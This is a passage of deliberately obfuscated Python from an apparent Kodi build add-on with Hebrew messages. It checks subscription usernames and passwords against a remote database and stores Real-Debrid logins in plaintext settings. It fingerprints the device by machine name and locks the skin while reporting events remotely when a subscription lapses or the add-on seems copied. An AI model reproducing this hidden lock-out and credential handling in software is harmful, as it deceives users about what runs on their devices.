                    O0O000O0OOO00O00O =re .compile (OOO000000O000OOO0 ).findall (OOOOO0OO0OOO00OO0 .decode ('utf-8'))[0 ]#line:889
                    setS ("sync_user",O0O000O0OOO00O00O .replace ('@','').replace (' ',''))#line:890
                    setS ("pass2","true")#line:891
                    if getS ("set_usersync")=='true':#line:892
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:893
                        O0O0OO000O0OO00OO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:894
                        O0O0OO000O0OO00OO .setSetting ('firebase',O0O000O0OOO00O00O .replace ('@','').replace (' ',''))#line:895
                        user_sync ()#line:897
                        setS ("set_usersync",'false')#line:898
                except :#line:899
                    OOO000000O000OOO0 =' = (.+?)\n'#line:900
                    O0O000O0OOO00O00O =re .compile (OOO000000O000OOO0 ).findall (OOOOO0OO0OOO00OO0 .decode ('utf-8'))[0 ]#line:901
                    setS ("sync_user",O0O000O0OOO00O00O .replace ('@','').replace (' ',''))#line:902
                    setS ("pass2","true")#line:903
                    if getS ("set_usersync")=='true':#line:904
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:905
                        O0O0OO000O0OO00OO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:906
                        O0O0OO000O0OO00OO .setSetting ('firebase',O0O000O0OOO00O00O .replace ('@','').replace (' ',''))#line:907
                        user_sync ()#line:909
                        setS ("set_usersync",'false')#line:910
            except :#line:912
                pass #line:913
            break #line:914
    O000OO00O0O0O00O0 =[]#line:916
    OOO000O0000O000OO =[]#line:917
    try :#line:918
        O0OOOOOOOO0O0O0O0 =read_skin ('playback')#line:919
        O0O000000OOOO00O0 =read_skin_dragon ('playback')#line:920
        O0OO0OO0OOO00O0O0 =[O0OOOOOOOO0O0O0O0 ,O0O000000OOOO00O0 ]#line:921
        for OO0OO0O00O00O0000 in O0OO0OO0OOO00O0O0 :#line:922
            for O000OO000OOOOOO0O in OO0OO0O00O00O0000 :#line:923
                OOOO000OOO000O0O0 =OO0OO0O00O00O0000 [O000OO000OOOOOO0O ]#line:924
                try :#line:925
                    O000OO00O0O0O00O0 .append ((OOOO000OOO000O0O0 ['name'],OOOO000OOO000O0O0 ['date'],OOOO000OOO000O0O0 ['sync'],OOOO000OOO000O0O0 ['dragon'],OOOO000OOO000O0O0 ['device'],OOOO000OOO000O0O0 ['rduser'],OOOO000OOO000O0O0 ['rdpass'],OOOO000OOO000O0O0 ['telegram_user'],OOOO000OOO000O0O0 ['p1'],OOOO000OOO000O0O0 ['p2'],OOOO000OOO000O0O0 ['p3']))#line:926
                except :#line:927
                    OOO000O0000O000OO .append ((OOOO000OOO000O0O0 ['name'],OOOO000OOO000O0O0 ['date'],OOOO000OOO000O0O0 ['sync'],OOOO000OOO000O0O0 ['dragon'],OOOO000OOO000O0O0 ['device']))#line:928
    except Exception as OO0OO00O00O000OO0 :#line:929
              LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]בעיה בשרת[/COLOR]"%COLOR2 )#line:930
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OO0OO00O00O000OO0 ))#line:931
              xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:932
              sys .exit ()#line:933
    for OOO00O0O00O0OOOO0 ,OOOOOO00O00OO000O ,O0O000O0OOO00O00O ,O00O0OO0OO0O00000 ,O0O0O0O0OOO0O0O0O ,OOO00O00OOO000OOO ,OO0O0OO0OOO0O00O0 ,OOOOOOO0O0O00O000 ,O00OO00O0000000OO ,O0O0O0O0O0OOOOO00 ,OOOO0OOOOOOOOOO0O in O000OO00O0O0O00O0 :#line:934
        if OOO00O0O00O0OOOO0 .split ()[0 ].lower ()==O0OO00O00OOO0OO00 :#line:936
            O0O0O0OO0OO0OOOOO =1 #line:938
            setS ("date_user",OOOOOO00O00OO000O .replace (' ',''))#line:939
            setS ("device",O0O0O0O0OOO0O0O0O .replace (' ',''))#line:940
            setS ("sync_user",O0O000O0OOO00O00O .replace (' ',''))#line:941
            setS ("rd_user",OOO00O00OOO000OOO .replace (' ',''))#line:942
            setS ("rd_pass",OO0O0OO0OOO0O00O0 .replace (' ',''))#line:943
            if len (OOO00O00OOO000OOO )>0 :#line:944
                setS ('auto_rd','true')#line:945
            if '@'in O00O0OO0OO0O00000 .replace (' ',''):#line:946
                    setS ("dragon","true")#line:947
            else :#line:948
                    setS ("dragon","false")#line:949
            if len (O0O000O0OOO00O00O )>0 :#line:950
                if getS ("set_usersync")=='true':#line:951
                 if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:952
                    O0O0OO000O0OO00OO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:953
                    O0O0OO000O0OO00OO .setSetting ('firebase',O0O000O0OOO00O00O .replace (' ',''))#line:954
                    user_sync ()#line:956
                    setS ("set_usersync",'false')#line:957
            break #line:958
    for OOO00O0O00O0OOOO0 ,OOOOOO00O00OO000O ,O0O000O0OOO00O00O ,O00O0OO0OO0O00000 ,O0O0O0O0OOO0O0O0O in OOO000O0000O000OO :#line:959
        if OOO00O0O00O0OOOO0 .split ()[0 ].lower ()==O0OO00O00OOO0OO00 :#line:961
            O0O0O0OO0OO0OOOOO =1 #line:962
            setS ("date_user",OOOOOO00O00OO000O .replace (' ',''))#line:963
            setS ("device",O0O0O0O0OOO0O0O0O .replace (' ',''))#line:964
            setS ("sync_user",O0O000O0OOO00O00O .replace (' ',''))#line:965
            if '@'in O00O0OO0OO0O00000 .replace (' ',''):#line:966
                    setS ("dragon","true")#line:967
            else :#line:968
                    setS ("dragon","false")#line:969
            if len (O0O000O0OOO00O00O )>0 :#line:970
                if getS ("set_usersync")=='true':#line:971
                 if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:972
                    O0O0OO000O0OO00OO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:973
                    O0O0OO000O0OO00OO .setSetting ('firebase',O0O000O0OOO00O00O .replace (' ',''))#line:974
                    user_sync ()#line:976
                    setS ("set_usersync",'false')#line:977
            break #line:978
    if O0O0O0OO0OO0OOOOO ==0 :#line:979
            if BUILDNAME =="":#line:980
                OOOOO0O00O0OO0OOO =[]#line:981
                OOOOO0O00O0OO0OOO .append (Thread (tryinstall ))#line:982
                OOOOO0O00O0OO0OOO [0 ].start ()#line:984
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]שם המשתמש שגוי[/COLOR]"%COLOR2 )#line:985
                ADDON .setSetting ("user",'')#line:986
                xbmc .executebuiltin ('Container.Refresh')#line:987
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:988
                OO00O0O000OOOO0OO =True #line:989
            if BUILDNAME ==" Kodi Premium":#line:990
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]שם המשתמש שגוי[/COLOR]"%COLOR2 )#line:992
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:993
                OO00O0O000OOOO0OO =True #line:994
    if O0O0O0OO0OO0OOOOO ==1 or OO00O0O000OOOO0OO ==True :#line:997
        if refresh =='true':#line:998
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:999
            xbmc .executebuiltin ('Container.Refresh')#line:1000
        try :#line:1001
            make_setting_file ()#line:1002
        except :pass #line:1003
        OOOO000000OOOOOO0 =getS ("date_user")#line:1004
        import datetime #line:1005
        if not OOOO000000OOOOOO0 =='':#line:1006
            OOOOOO00O00OO000O =OOOO000000OOOOOO0 .split ('.')#line:1007
            O000OOO00OO00OO0O =datetime .date (int (OOOOOO00O00OO000O [2 ]),int (OOOOOO00O00OO000O [1 ]),int (OOOOOO00O00OO000O [0 ]))#line:1008
            if getS ("check_user")=='true':#line:1009
              if str (TODAY )>=str (O000OOO00OO00OO0O ):#line:1010
                 setS ("check_user",'false')#line:1011
                 if BUILDNAME ==" Kodi Premium":#line:1012
                     Account_Send (que (' מנוי הסתיים - התקנה פעילה '),OOOO000000OOOOOO0 )#line:1013
            if str (O000OOO00OO00OO0O )>str (TODAY ):#line:1014
                 setS ("check_user",'true')#line:1015
            else :#line:1016
                if not xbmc .Player ().isPlaying ():#line:1017
                  if os .path .exists (os .path .join (ADDONS ,'skin.Premium.mod')):#line:1019
                        OO000OO0O00OO0OO0 =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:1020
                        try :#line:1021
                            O000OO0OO000O00OO =open (OO000OO0O00OO0OO0 ,'r')#line:1022
                            OO0O00O0OOO000OO0 =O000OO0OO000O00OO .read ()#line:1023
                            O000OO0OO000O00OO .close ()#line:1024
                        except :#line:1025
                            O000OO0OO000O00OO =open (OO000OO0O00OO0OO0 ,'r',encoding ='utf-8')#line:1026
                            OO0O00O0OOO000OO0 =O000OO0OO000O00OO .read ()#line:1027
                            O000OO0OO000O00OO .close ()#line:1028
                        O0O00000000O0000O ='<setting id="username" type="bool(.+?)/setting>'#line:1029
                        O0O0OO0OO00O00O0O =re .compile (O0O00000000O0000O ).findall (OO0O00O0OOO000OO0 )[0 ]#line:1030
                        if 'false'in O0O0OO0OO00O00O0O :#line:1031
                             xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:1032
                             if getS ('dragon')=='true':#line:1033
                                contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש יש לפנות למנהלים')#line:1034
                             else :#line:1035
                               contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1036
                             xbmc .executebuiltin ("ActivateWindow(home)")#line:1038
                             xbmc .executebuiltin ("ReloadSkin()")#line:1039
                             Account_Send (que ('מנוי ננעל'),OOOO000000OOOOOO0 )#line:1040
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1041
                if BUILDNAME =="":#line:1042
                  if getS ('dragon')=='true':#line:1043
                    contact_wiz ('החשבון לא פעיל, \nיש לפנות למנהלים  ')#line:1044
                  else :#line:1045
                    contact_wiz ('החשבון לא פעיל, \nיש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1046
                  Account_Send (que (' מנוי הסתיים - התקנה חדשה'),OOOO000000OOOOOO0 )#line:1047
                sys .exit ()#line:1048
            if getS ("check_user")=='true':#line:1050
                if str (ONEWEEK )>str (O000OOO00OO00OO0O ):#line:1051
                 if not xbmc .Player ().isPlaying ():#line:1052
                    OOOOOOOOOO00OOOO0 =getS ("show_alert")#line:1053
                    OOOOO0000OO00OOOO =getS ('nextcleandate')#line:1054
                    if OOOOOOOOOO00OOOO0 =='true':#line:1058
                        setS ("show_alert",'false')#line:1059
                        Account_Send (que (' מנוי עומד להסתיים '),OOOO000000OOOOOO0 )#line:1060
                        if BUILDNAME ==" Kodi Premium":#line:1061
                            if getS ('dragon')=='true':#line:1062
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OOOO000000OOOOOO0 +'[/COLOR]'+'\n'+'לחידוש יש לפנות למנהלים.')#line:1063
                            else :#line:1064
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+OOOO000000OOOOOO0 +'[/COLOR]'+'\n'+'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')#line:1065
                else :#line:1067
                    setS ("show_alert",'true')#line:1068
    if xbmc .getCondVisibility ('system.platform.android')or xbmc .getCondVisibility ('system.platform.windows'):#line:1071
        import platform #line:1072
        OO0OO00O0O0O0000O =platform .uname ()#line:1073
        O00O0OO000O0O000O =OO0OO00O0O0O0000O [1 ]#line:1074
        if getS ("set_platform_name")=='false':#line:1075
            setS ("platform_name",O00O0OO000O0O000O )#line:1076
            setS ("set_platform_name",'true')#line:1077
        if not getS ("platform_name")==O00O0OO000O0O000O and not getS ("platform_name")=='':#line:1078
          if os .path .exists (os .path .join (ADDONS ,'skin.Premium.mod')):#line:1079
                OO000OO0O00OO0OO0 =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:1080
                try :#line:1081
                    O000OO0OO000O00OO =open (OO000OO0O00OO0OO0 ,'r')#line:1082
                    OO0O00O0OOO000OO0 =O000OO0OO000O00OO .read ()#line:1083
                    O000OO0OO000O00OO .close ()#line:1084
                except :#line:1085
                    O000OO0OO000O00OO =open (OO000OO0O00OO0OO0 ,'r',encoding ='utf-8')#line:1086
                    OO0O00O0OOO000OO0 =O000OO0OO000O00OO .read ()#line:1087
                    O000OO0OO000O00OO .close ()#line:1088
                O0O00000000O0000O ='<setting id="username" type="bool(.+?)/setting>'#line:1089
                O0O0OO0OO00O00O0O =re .compile (O0O00000000O0000O ).findall (OO0O00O0OOO000OO0 )[0 ]#line:1090
                if 'false'in O0O0OO0OO00O00O0O :#line:1091
                     xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:1092
                     contact_wiz ('התקנה לא חוקית, \nיש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1093
                     xbmc .executebuiltin ("ActivateWindow(home)")#line:1095
                     xbmc .executebuiltin ("ReloadSkin()")#line:1096
                     Account_Send (que ('ניסיון העתקה - מנוי ננעל'),OOOO000000OOOOOO0 )#line:1097
    if OO00O0O000OOOO0OO ==True :#line:1098
        sys .exit ()#line:1099
    return 'ok'#line:1100
def STARTP_old ():#line:1102
    O0O00OOOOOOO0O000 =(ADDON .getSetting ("user"))#line:1104
    O0O00OOOOOOO0O000 =O0O00OOOOOOO0O000 .lower ()#line:1105
    try :#line:1106
        O00O0O000O0O0OOOO =urlopen (ld (US ))#line:1107
        O0OOO0O0OO0OO0OOO =O00O0O000O0O0OOOO .readlines ()#line:1108
    except Exception as O00OOO0O000OO0O0O :#line:1109
        O0OOO0O0OO0OO0OOO =''#line:1110
        logging .warning ('לא מתחבר לשרת או שאין אינטרנט'+str (O00OOO0O000OO0O0O ))#line:1111
    O0O000OO0O0O0O0O0 =0 #line:1112
    for OO0OO0O000O000O0O in O0OOO0O0OO0OO0OOO :#line:1114
        if OO0OO0O000O000O0O .decode ('utf-8').split (' ==')[0 ]==O0O00OOOOOOO0O000 or OO0OO0O000O000O0O .decode ('utf-8').split ()[0 ]==O0O00OOOOOOO0O000 :#line:1115
            O0O000OO0O0O0O0O0 =1 #line:1116
            if '@'in OO0OO0O000O000O0O .decode ('utf-8'):#line:1118
                    setS ("dragon","true")#line:1119
            else :#line:1120
                    setS ("dragon","false")#line:1121
            try :#line:1122
                try :#line:1123
                    O00O0OO0O0O0OOOO0 =' == (.+?) = '#line:1124
                    OO0O0O0OO0OOOO000 =re .compile (O00O0OO0O0O0OOOO0 ).findall (OO0OO0O000O000O0O .decode ('utf-8'))[0 ]#line:1125
                    setS ("date_user",OO0O0O0OO0OOOO000 .replace ('@','').replace (' ',''))#line:1126
                except :#line:1128
                    O00O0OO0O0O0OOOO0 =' == (.+?)\n'#line:1129
                    OO0O0O0OO0OOOO000 =re .compile (O00O0OO0O0O0OOOO0 ).findall (OO0OO0O000O000O0O .decode ('utf-8'))[0 ]#line:1130
                    setS ("date_user",OO0O0O0OO0OOOO000 .replace ('@','').replace (' ',''))#line:1132
            except :#line:1133
                OO0O0O0OO0OOOO000 =''#line:1134
                setS ("date_user",OO0O0O0OO0OOOO000 .replace ('@','').replace (' ',''))#line:1135
            try :#line:1136
                try :#line:1137
                    OO00O00000OO0O0OO =' = (.+?) @ '#line:1138
                    O0OOOOO00000O0OO0 =re .compile (OO00O00000OO0O0OO ).findall (OO0OO0O000O000O0O .decode ('utf-8'))[0 ]#line:1139
                    setS ("sync_user",O0OOOOO00000O0OO0 .replace ('@','').replace (' ',''))#line:1140
                    setS ("pass2","true")#line:1141
                    if getS ("set_usersync")=='true':#line:1142
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:1143
                        OO0000O0O0000OOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:1144
                        OO0000O0O0000OOOO .setSetting ('firebase',O0OOOOO00000O0OO0 .replace ('@','').replace (' ',''))#line:1145
                        user_sync ()#line:1147
                        setS ("set_usersync",'false')#line:1148
                except :#line:1149
                    OO00O00000OO0O0OO =' = (.+?)\n'#line:1150
                    O0OOOOO00000O0OO0 =re .compile (OO00O00000OO0O0OO ).findall (OO0OO0O000O000O0O .decode ('utf-8'))[0 ]#line:1151
                    setS ("sync_user",O0OOOOO00000O0OO0 .replace ('@','').replace (' ',''))#line:1152
                    setS ("pass2","true")#line:1153
                    if getS ("set_usersync")=='true':#line:1154
                     if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:1155
                        OO0000O0O0000OOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:1156
                        OO0000O0O0000OOOO .setSetting ('firebase',O0OOOOO00000O0OO0 .replace ('@','').replace (' ',''))#line:1157
                        user_sync ()#line:1159
                        setS ("set_usersync",'false')#line:1160
            except :#line:1162
                pass #line:1163
            break #line:1164
    OOOO00OOOOO0O0O00 =[]#line:1166
    try :#line:1167
        O00O0OOO0OO0O0O0O =read_skin ('playback')#line:1168
        for O0OO0O0O0OO0O000O in O00O0OOO0OO0O0O0O :#line:1169
            OO0000000O0O0OO00 =O00O0OOO0OO0O0O0O [O0OO0O0O0OO0O000O ]#line:1170
            OOOO00OOOOO0O0O00 .append ((OO0000000O0O0OO00 ['name'],OO0000000O0O0OO00 ['date'],OO0000000O0O0OO00 ['sync'],OO0000000O0O0OO00 ['dragon'],OO0000000O0O0OO00 ['device']))#line:1171
    except Exception as O00OOO0O000OO0O0O :#line:1172
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O00OOO0O000OO0O0O ))#line:1173
    for OOOOO000OOO00OOO0 ,OOO0OOOOOO00OO0O0 ,O0OOOOO00000O0OO0 ,O00O00OOO0O00OOOO ,O0O0OOO000OO0OO0O in OOOO00OOOOO0O0O00 :#line:1174
        if OOOOO000OOO00OOO0 .split ()[0 ].lower ()==O0O00OOOOOOO0O000 :#line:1176
            O0O000OO0O0O0O0O0 =1 #line:1177
            setS ("date_user",OOO0OOOOOO00OO0O0 .replace (' ',''))#line:1178
            setS ("device",O0O0OOO000OO0OO0O .replace (' ',''))#line:1179
            setS ("sync_user",O0OOOOO00000O0OO0 .replace (' ',''))#line:1180
            if '@'in O00O00OOO0O00OOOO .replace (' ',''):#line:1181
                    setS ("dragon","true")#line:1182
            else :#line:1183
                    setS ("dragon","false")#line:1184
            if getS ("set_usersync")=='true':#line:1186
             if os .path .exists (translatepath ("special://home/addons/plugin.program.Settingz-Anon")):#line:1187
                OO0000O0O0000OOOO =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:1188
                OO0000O0O0000OOOO .setSetting ('firebase',O0OOOOO00000O0OO0 .replace (' ',''))#line:1189
                user_sync ()#line:1191
                setS ("set_usersync",'false')#line:1192
    if O0O000OO0O0O0O0O0 ==0 :#line:1193
        try :#line:1194
            make_setting_file ()#line:1195
        except :pass #line:1196
        O0O00OO000O0OOOOO =DIALOG .yesno ("%s"%"בעיה בשם המשתמש","שם המשתמש שהוכנס אינו נכון,",'ביטול',yeslabel ="הכנס שם משתמש")#line:1198
        if BUILDNAME =="":#line:1200
            LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',"לקבלת שם משתמש יש לפנות לכתובת הזאת בטלגרם:"),'[COLOR %s]https://t.me/xbmc19[/COLOR]'%COLOR2 )#line:1201
            xbmc .executebuiltin ("ActivateWindow(home)")#line:1202
        if O0O00OO000O0OOOOO :#line:1203
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1204
            ADDON .openSettings ()#line:1205
            sys .exit ()#line:1206
        else :#line:1207
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1208
            if BUILDNAME ==" Kodi Premium":#line:1209
                O0O0O0OOOO00OOO00 =[]#line:1210
                O0O0O0OOOO00OOO00 .append (Thread (kilxz ))#line:1211
                O0O0O0OOOO00OOO00 .append (Thread (gdrive ))#line:1212
                O0O0O0OOOO00OOO00 .append (Thread (no_u ))#line:1213
                O0O0O0OOOO00OOO00 [0 ].start ()#line:1214
                xbmcgui .Dialog ().ok ('Anonymous TV','ללא שם משתמש המערכת לא תתעדכן יותר.')#line:1219
                sys .exit ()#line:1220
            sys .exit ()#line:1221
    else :#line:1222
        O0OOOO00O0000OO0O =getS ("date_user")#line:1223
        import datetime #line:1224
        if not O0OOOO00O0000OO0O =='':#line:1225
            OOO0OOOOOO00OO0O0 =O0OOOO00O0000OO0O .split ('.')#line:1226
            O0OOO000OOO00O00O =datetime .date (int (OOO0OOOOOO00OO0O0 [2 ]),int (OOO0OOOOOO00OO0O0 [1 ]),int (OOO0OOOOOO00OO0O0 [0 ]))#line:1227
            if getS ("check_user")=='true':#line:1228
              if str (TODAY )>=str (O0OOO000OOO00O00O ):#line:1229
                 setS ("check_user",'false')#line:1230
                 if BUILDNAME ==" Kodi Premium":#line:1231
                     Account_Send (que (' מנוי הסתיים - התקנה פעילה '),O0OOOO00O0000OO0O )#line:1232
            if str (O0OOO000OOO00O00O )>str (TODAY ):#line:1233
                 setS ("check_user",'true')#line:1234
            else :#line:1236
                if not xbmc .Player ().isPlaying ():#line:1237
                  if BUILDNAME ==" Kodi Premium":#line:1238
                    if getS ('dragon')=='true':#line:1239
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים יש לפנות למנהלים')#line:1240
                    else :#line:1241
                       contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1242
                  else :#line:1243
                    if getS ('dragon')=='true':#line:1244
                        contact_wiz ('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשלושה חודשים נוספים יש לפנות למנהלים')#line:1245
                    else :#line:1246
                        contact_wiz ('תקופת המנוי הסתיימה, \nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:1247
                  if str (MONTH )>=str (O0OOO000OOO00O00O ):#line:1248
                    OOOO000000O000OOO =os .path .join (translatepath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:1249
                    try :#line:1250
                        O0OOOOOOO0OOOO0OO =open (OOOO000000O000OOO ,'r')#line:1251
                        OO0O0O0000OOOOOO0 =O0OOOOOOO0OOOO0OO .read ()#line:1252
                        O0OOOOOOO0OOOO0OO .close ()#line:1253
                    except :#line:1254
                        O0OOOOOOO0OOOO0OO =open (OOOO000000O000OOO ,'r',encoding ='utf-8')#line:1255
                        OO0O0O0000OOOOOO0 =O0OOOOOOO0OOOO0OO .read ()#line:1256
                        O0OOOOOOO0OOOO0OO .close ()#line:1257
                    O00O0OO0O0O0OOOO0 ='<setting id="username" type="bool(.+?)/setting>'#line:1258
                    OO0O0O0OO0OOOO000 =re .compile (O00O0OO0O0O0OOOO0 ).findall (OO0O0O0000OOOOOO0 )[0 ]#line:1259
                    if 'false'in OO0O0O0OO0OOOO000 :#line:1260
                     xbmc .executebuiltin ("Skin.ToggleSetting(username)")#line:1261
                     xbmc .executebuiltin ("ActivateWindow(home)")#line:1262
                     xbmc .executebuiltin ("ReloadSkin()")#line:1263
                     Account_Send (que ('מנוי ננעל'),O0OOOO00O0000OO0O )#line:1264
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1265
                if BUILDNAME =="":#line:1266
                  Account_Send (que (' מנוי הסתיים - התקנה חדשה'),O0OOOO00O0000OO0O )#line:1267
                sys .exit ()#line:1268
            if getS ("check_user")=='true':#line:1270
                if str (ONEWEEK )>str (O0OOO000OOO00O00O ):#line:1271
                 if not xbmc .Player ().isPlaying ():#line:1272
                    O000O00O00O0O0OOO =getS ("show_alert")#line:1273
                    OO0OOOOOOO0OO00O0 =getS ('nextcleandate')#line:1274
                    if O000O00O00O0O0OOO =='true':#line:1278
                        setS ("show_alert",'false')#line:1279
                        Account_Send (que (' מנוי עומד להסתיים '),O0OOOO00O0000OO0O )#line:1280
                        if BUILDNAME ==" Kodi Premium":#line:1281
                            if getS ('dragon')=='true':#line:1282
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+O0OOOO00O0000OO0O +'[/COLOR]'+'\n'+'לחידוש לשלושה חודשים נוספים יש לפנות למנהלים.')#line:1283
                            else :#line:1284
                                contact_wiz ("תקופת המנוי עומדת להסתיים בתאריך: "+'[COLOR red]'+O0OOOO00O0000OO0O +'[/COLOR]'+'\n'+'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')#line:1285
                else :#line:1287
                    setS ("show_alert",'true')#line:1288
    return 'ok'#line:1290
def STARTP2 ():#line:1291
    OOOO0O0O0O0O00000 =[]#line:1292
    OOO0OO000OOOO00OO =0 #line:1293
    O00OOOO0O00O0OOO0 =(ADDON .getSetting ("pass"))#line:1295
    try :#line:1296
        OO0O00OO000O00OO0 =read_skin ('password')#line:1297
        for O00OOO0O0OO0O000O in OO0O00OO000O00OO0 :#line:1298
            O0O0O0O0OOO00O00O =OO0O00OO000O00OO0 [O00OOO0O0OO0O000O ]#line:1299
            OOOO0O0O0O0O00000 .append ((O0O0O0O0OOO00O00O ['password']))#line:1300
    except Exception as OO0000O0OO0O000OO :#line:1301
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OO0000O0OO0O000OO ))#line:1302
    for OO0OOOO00O0OO0O00 in OOOO0O0O0O0O00000 :#line:1303
        if OO0OOOO00O0OO0O00 .split ()[0 ].lower ()==O00OOOO0O00O0OOO0 :#line:1305
            OOO0OO000OOOO00OO =1 #line:1306
            break #line:1307
    if OOO0OO000OOOO00OO ==0 :#line:1308
        return ''#line:1310
    return 'ok'#line:1312
def STARTP2_old ():#line:1313
    O0O0OOO000OOO0OOO =[]#line:1323
    OOO0OO000OO0OO0OO =0 #line:1324
    O0OO00O0OO00000O0 =(ADDON .getSetting ("pass"))#line:1325
    try :#line:1326
        O0OOOOOOOOO00OO00 =read_skin ('password')#line:1327
        for OO0O0O000O0OOOO00 in O0OOOOOOOOO00OO00 :#line:1328
            O0O00OO000O0O0OOO =O0OOOOOOOOO00OO00 [OO0O0O000O0OOOO00 ]#line:1329
            O0O0OOO000OOO0OOO .append ((O0O00OO000O0O0OOO ['password']))#line:1330
    except Exception as OO0O00OO0O0OO00O0 :#line:1331
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (OO0O00OO0O0OO00O0 ))#line:1332
    for O0000OOO0OOOO0O00 in O0O0OOO000OOO0OOO :#line:1333
        if O0000OOO0OOOO0O00 .split ()[0 ].lower ()==O0OO00O0OO00000O0 :#line:1335
            OOO0OO000OO0OO0OO =1 #line:1336
    if OOO0OO000OO0OO0OO ==0 :#line:1337
        try :#line:1338
            OO0O00O0O00O000OO =DIALOG .yesno ("%s"%"בעיה בסיסמה","הסיסמה אינה נכונה,","הכנס את הסיסמה כעת",nolabel ="ביטול",yeslabel ="הכנס סיסמה")#line:1339
        except :#line:1340
            OO0O00O0O00O000OO =DIALOG .yesno ("%s"%"בעיה בסיסמה","הסיסמה אינה נכונה,",'ביטול',yeslabel ="הכנס סיסמה")#line:1341
        LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',"לקבלת סיסמה יש לפנות לכתובת הזאת בטלגרם:"),'[COLOR %s]https://t.me/xbmc19[/COLOR]'%COLOR2 )#line:1343
        if BUILDNAME =="":#line:1344
            xbmc .executebuiltin ("ActivateWindow(home)")#line:1345
        if OO0O00O0O00O000OO :#line:1346
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1347
            O0O000O000O0O00OO =[]#line:1348
            O0O000O000O0O00OO .append (Thread (tryinstall ))#line:1349
            O0O000O000O0O00OO [0 ].start ()#line:1351
            ADDON .openSettings ()#line:1353
            sys .exit ()#line:1354
        else :#line:1356
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1357
            sys .exit ()#line:1358
    return 'ok'#line:1360
def checkWizard (OO0OO0OOO00O00O0O ):#line:1363
    if not workingURL (WIZARDFILE )==True :return False #line:1364
    O000OO00O00OO00OO =openURL (WIZARDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1365
    O000O0OOOO00O0OOO =re .compile ('id="%s".+?ersion="(.+?)".+?ip="(.+?)"'%ADDON_ID ).findall (O000OO00O00OO00OO )#line:1366
    if len (O000O0OOOO00O0OOO )>0 :#line:1367
        for O0O0OOO0O0OOOOO00 ,O0OOOOOOO0OO0OOO0 in O000O0OOOO00O0OOO :#line:1368
            if OO0OO0OOO00O00O0O =='version':return O0O0OOO0O0OOOOO00 #line:1369
            elif OO0OO0OOO00O00O0O =='zip':return O0OOOOOOO0OO0OOO0 #line:1370
